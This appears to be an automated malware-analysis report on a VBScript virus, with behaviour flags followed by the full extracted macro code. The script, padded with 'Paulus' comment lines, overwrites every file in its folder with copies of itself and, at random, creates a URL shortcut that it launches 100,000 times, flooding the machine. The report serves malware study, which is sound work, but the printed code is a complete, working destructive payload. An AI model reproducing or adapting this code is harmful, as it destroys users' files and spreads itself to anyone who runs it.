behavior.Run: May run an executable file or a system command
behavior.Shell: May run an executable file or a system command
behavior.Wscript.Shell: May run an executable file or a system command

docinfo.macro:
'Paulus
On Error Resume Next
'Paulus
Dim Paulus, Paulus_1, Paulus_2, Paulus_3, Paulus_4
'Paulus
Randomize
'Paulus
Set Paulus_2 = CreateObject("Scripting.FileSystemObject")
'Paulus
Set Paulus_1 = Wscript.CreateObject("Wscript.Shell")
'Paulus
Paulus = Wscript.ScriptFullName
'Paulus
Paulus_3 = Left(Paulus, InStrRev(Paulus, "\"))
'Paulus
For Each target in Paulus_2.GetFolder(Paulus_3).Files
'Paulus
  Paulus_2.CopyFile Paulus, target.Name, 1
'Paulus
Next
'Paulus
If Int((2 * Rnd) + 1) = 1 Then
'Paulus
  Set Paulus_4 = Paulus_1.CreateShortcut("C:\Paulus.URL")
'Paulus
  Paulus_4.TargetPath = "http://www..net"
'Paulus
  Paulus_4.Save
'Paulus
  For x = 1 to 100000
'Paulus
     Paulus_1.Run ("C:\Paulus.URL")
'Paulus
  Next
'Paulus
End If
'Paulus

filetype: ASCII text, with CRLF line terminators

dump: Dim Paulus, Paulus_1, Paulus_2, Paulus_3, Paulus_4
